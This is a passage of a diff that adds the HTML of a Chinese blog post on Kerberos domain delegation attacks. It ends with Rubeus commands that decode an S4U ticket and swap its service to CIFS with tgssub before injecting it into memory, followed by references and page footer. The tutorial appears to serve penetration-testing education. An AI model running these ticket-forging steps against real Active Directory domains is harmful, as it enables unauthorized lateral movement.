+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127160903.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127160903.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127160903.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127160903.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127160903.png-water_print" /></p>
+<p>解密 base64 后的票据：</p>
+<p><code>rubeus.exe describe /ticker:S4Ubase64 doIFxxxxxxx</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127161042.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127161042.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127161042.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127161042.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127161042.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127161042.png-water_print" /></p>
+<p>发现 SPN 并没有指定服务</p>
+<p>利用 Rubeus 完成票据修改：</p>
+<p><code>rubeus.exe tgssub /ticket:base64EncodeTicket /altservice:cifs/test1 /ptt</code></p>
+<p>修改后导入内存即可。</p>
+<p>参考：</p>
+<ul>
+<li><a href="http://www.const27.com/2020/10/12/%e5%9f%9f%e5%a7%94%e6%b4%be%e6%94%bb%e5%87%bb/" target="_blank" rel="noopener noreffer">http://www.const27.com/2020/10/12/域委派攻击/</a></li>
+<li><a href="https://eviladan0s.github.io/2020/04/14/kerberos-delegation/" target="_blank" rel="noopener noreffer">https://eviladan0s.github.io/2020/04/14/kerberos-delegation/</a></li>
+<li><a href="https://xz.aliyun.com/t/7217" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/7217</a></li>
+<li><a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj553400%28v=ws.11%29" target="_blank" rel="noopener noreffer">https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj553400(v=ws.11)</a></li>
+<li><a href="https://daiker.gitbook.io/windows-protocol/kerberos/2#0x05-wei-pai" target="_blank" rel="noopener noreffer">https://daiker.gitbook.io/windows-protocol/kerberos/2#0x05-wei-pai</a></li>
+<li><a href="https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie" target="_blank" rel="noopener noreffer">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-01-25</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/" data-title="基于域委派的攻击"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/" data-title="基于域委派的攻击"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/" data-title="基于域委派的攻击"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%9F%9F%E5%AE%89%E5%85%A8/">域安全</a>,&nbsp;<a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>,&nbsp;<a href="/tags/%E5%9F%9F%E5%A7%94%E6%B4%BE/">域委派</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/" class="prev" rel="prev" title="基于域信任关系的域攻击"><i class="fas fa-angle-left fa-fw"></i>基于域信任关系的域攻击</a>
+            <a href="/2020/05/dcsync-%E6%94%BB%E5%87%BB/" class="next" rel="next" title="DCSync 攻击">DCSync 攻击<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
